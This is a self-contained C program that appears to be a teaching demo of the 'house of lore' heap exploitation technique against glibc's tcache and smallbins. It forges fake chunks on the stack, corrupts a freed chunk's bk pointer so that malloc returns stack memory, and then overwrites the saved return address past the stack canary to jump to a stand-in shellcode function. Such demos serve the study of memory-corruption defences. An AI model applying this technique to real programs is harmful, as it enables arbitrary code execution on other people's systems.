#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

void jackpot(){ fprintf(stderr, "Nice jump d00d\n"); exit(0); }

int main(int argc, char * argv[]){
    intptr_t* stack_buffer_1[4] = {0};
    intptr_t* stack_buffer_2[4] = {0};
    void* fake_freelist[7][4];

    intptr_t *victim = malloc(0x100);
    printf("Our victim chunk %p\n", victim);

    // Prepare tcache fill
    void *dummies[7];
    for(int i=0; i<7; i++) dummies[i] = malloc(0x100);

    // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
    intptr_t *victim_chunk = victim-2;

    printf("stack_buffer_1 at %p\n", stack_buffer_1);
    printf("stack_buffer_2 at %p\n", stack_buffer_2);

    for(int i=0; i<6; i++) {
        fake_freelist[i][3] = fake_freelist[i+1];
    }
    fake_freelist[6][3] = NULL;
    printf("fake free-list at %p\n", fake_freelist);

    // stack_buffer_1->fd = victim_chunk
    stack_buffer_1[0] = 0;
    stack_buffer_1[1] = 0;
    stack_buffer_1[2] = victim_chunk;

    // stack_buffer_1->bk = stack_buffer_2
    stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
    // stack_buffer_2->fd = stack_buffer_1
    stack_buffer_2[2] = (intptr_t*)stack_buffer_1;

    // stack_buffer_2->bk = fake_freelist ; prevent crash at smallbin_to_tcache mechanism
    stack_buffer_2[3] = (intptr_t *)fake_freelist[0];

    // avoid consolidation top chunk
    void *p5 = malloc(1000);

    // Fill up tcache
    for(int i=0; i<7; i++) free(dummies[i]);

    // Put victim chunk in unsorted bin
    free((void*)victim);

    // Force sort of the unsorted bin
    void *p2 = malloc(1200);

    // Vuln victim->bk = stack_buffer_1
    victim[1] = (intptr_t)stack_buffer_1;

    // Clean tcache
    for(int i=0; i<7; i++) malloc(0x100);

    // malloc will retrive victim ; here bin->bk == victim and the tcache is filled with 7 smallbin chunks
    void *p3 = malloc(0x100);

    // next malloc will return fake_freelist[5] (fake_freelist[6] prevents smallbin corruption failure)
    char *p4 = malloc(0x100);

    printf("p4 is %p and should be on the stack!\n", p4);
    intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode

    long offset = (long)__builtin_frame_address(0) - (long)p4;
    memcpy((p4+offset+8), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary

    // sanity check
    assert((long)__builtin_return_address(0) == (long)jackpot);
}
